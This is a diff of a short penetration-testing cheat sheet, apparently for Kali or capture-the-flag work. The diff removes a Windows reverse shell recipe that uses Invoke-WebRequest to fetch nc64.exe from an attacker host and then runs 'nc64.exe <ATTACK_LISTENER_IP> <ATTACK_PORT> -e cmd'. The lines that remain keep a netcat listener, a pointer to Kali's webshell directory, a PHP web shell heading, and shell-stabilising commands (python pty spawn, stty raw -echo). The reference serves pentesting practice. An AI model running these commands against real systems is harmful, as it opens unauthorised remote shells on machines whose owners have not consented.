@@ -2,18 +2,10 @@ For kali Shell scripts:
 ```
 /usr/share/webshells
 ```
-
-# Windows Reverse Shell
-``` powershell
-#ALLWAYS USE nc.exe or nc64.exe in /Are/pentest/netcat
-#Transfer to target windows machine
-Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <FILENAME>
-#Run with cmd
-.\nc64.exe <ATTACK_LISTENER_IP> <ATTACK_PORT> -e cmd
-```
-### Reverse Shell
+### Reverse Shell listener
 ```shell
 nc -lvnp 4444
+# Windows Reverse Shell
 ```
 ### PHP Web Shell
 ``` php
@@ -29,8 +21,7 @@ export TERM=xterm
 <Ctrl+Z>
 stty raw -echo;fg
 ```
-
-from siren. (test if works then overwrite above)
+or
 ``` bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-255color
